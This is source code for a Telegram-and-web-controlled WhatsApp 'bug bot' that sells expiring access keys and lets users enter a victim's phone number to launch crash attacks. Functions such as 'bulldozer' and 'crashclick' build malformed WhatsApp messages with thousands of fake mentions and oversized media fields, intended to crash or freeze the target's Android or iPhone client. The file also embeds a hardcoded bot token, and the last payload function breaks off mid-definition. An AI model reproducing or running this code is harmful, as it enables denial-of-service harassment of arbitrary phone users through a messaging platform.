// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8315987335:AAEYyo-Qux5LY9UQ0ajCWfqyRTpLP9QJ8f8";
const OWNER_ID = "6935642012";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
// Helper sleep function
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "DEWA1234");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `( 🍁 ) ─── ❖ 情報 ❖  
𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 × 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺  
─── 革命的な自動化システム ───  
高速・柔軟性・絶対的な安全性を備えた 次世代ボットが今、覚醒する。

〢「 𝐗𝐈𝐒 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
 ࿇ Author : —!s' anonymous_vxc
 ࿇ Type : ( Case─Plugins )
 ࿇ League : Asia/Jakarta-
┌─────────
├──── ▢ ( 𖣂 ) Sender Handler
├── ▢ owner users
│── /addbot — &lt;nomor&gt;
│── /listsender —
│── /delsender — &lt;nomor&gt;
│── /add — &lt;cards.json&gt;
└────
┌─────────
├──── ▢ ( 𖣂 ) Key Manager
├── ▢ admin users
│── /ckey — &lt;username,durasi&gt;
│── /listkey —
│── /delkey — &lt;username&gt;
└────
┌─────────
├──── ▢ ( 𖣂 ) Access Controls
├── ▢ owner users
│── /addacces — &lt;user/id&gt;
│── /delacces — &lt;user/id&gt;
│── /addowner — &lt;user/id&gt;
│── /delowner — &lt;user/id&gt;
│── /setjeda — &lt;1m/1d/1s&gt;
└────`;
  
  ctx.reply(teks, { parse_mode: "HTML" });
});

// Sender management commands
bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addbot Number_\n_Example : /addbot 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args   = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - ONLY ACCES USER\n—Please register first to access this feature."
    );
  }
  
  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ *Syntax Error!*\n\n_Use : /ckey User,Day_\n_Example : /ckey rann,30d",
      { parse_mode: "Markdown" }
    );
  }

  const [username, durasiStr] = args.split(",");
  const durationMs            = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h"
    );
  }

  const key     = generateKey(4);
  const expired = Date.now() + durationMs;
  const users   = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year    : "numeric",
    month   : "2-digit",
    day     : "2-digit",
    hour    : "2-digit",
    minute  : "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // Kirim detail ke user (DM)
  ctx.telegram.sendMessage(
    userId,
    `✅ *Key berhasil dibuat:*\n\n` +
    `🆔 *Username:* \`${username}\`\n` +
    `🔑 *Key:* \`${key}\`\n` +
    `⏳ *Expired:* _${expiredStr}_ WIB\n\n` +
    `*Note:*\n- Jangan di sebar\n- Jangan Di Freekan\n- Jangan Di Jual Lagi`,
    { parse_mode: "Markdown" }
  ).then(() => {
    // Setelah terkirim → kasih notifikasi di group
    ctx.reply("✅ Success Send Key");
  }).catch(err => {
    ctx.reply("❌ Gagal mengirim key ke user.");
    console.error("Error kirim key:", err);
  });
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rann");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
╭╮╱╭┳━━━┳━━━┳╮╱╱╭━━━┳━━━┳━╮╱╭┳━━━╮
┃┃╱┃┃╭━╮┃╭━╮┃┃╱╱┃╭━╮┃╭━╮┃┃╰╮┃┃╭━╮┃
┃╰━╯┃┃╱┃┃╰━━┫┃╱╱┃┃╱┃┃┃╱┃┃╭╮╰╯┃┃╱┃┃
┃╭━╮┃┃╱┃┣━━╮┃┃╱╭┫┃╱┃┃┃╱┃┃┃╰╮┃┃┃╱┃┃
┃┃╱┃┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃┃╱┃┃┃╰━╯┃
╰╯╱╰┻━━━┻━━━┻━━━┻━━━┻━━━┻╯╱╰━┻━━━╯⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT DEWA-X APPS
├─ ID OWN : ${OWNER_ID}
├─ DEVOLOPER : RANNTZYBACK2 
├─ CREDIT BY : RANNTZYBACK2 
├─ MY SUPPORT : ALLAH 
├─ BOT : CONNECTED ✅
╰───────────────────`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        androcrash(24, target);
      } else if (mode === "ios") {
        Ipongcrash(24, target);
      } else if (mode === "andros-delay") {
        androdelay(24, target);
      } else if (mode === "invis-iphone") {
        Iponginvis(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, () => {
  console.log(`🚀 Server aktif di ${domain}:${port}`);
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== FLOOD FUNCTIONS ==================== //
// ====== FUNC FC IOS AND ANDRO ====== //
async function bulldozer(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  }

  const msg = generateWAMessageFromContent(target, message, {})

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  })
}

async function crashclick(sock, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
        fileLength: "9999999999999",
        height: 9999,
        width: 9999,
        mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
        fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
        directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1755254367",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAB..."
    };

    const contextInfo = {
        participant: target,
        mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
        ],
        remoteJid: "target",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
            paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
            }
        }
    };

    const Interactive = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo,
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: { hasMediaAttachment: true, imageMessage },
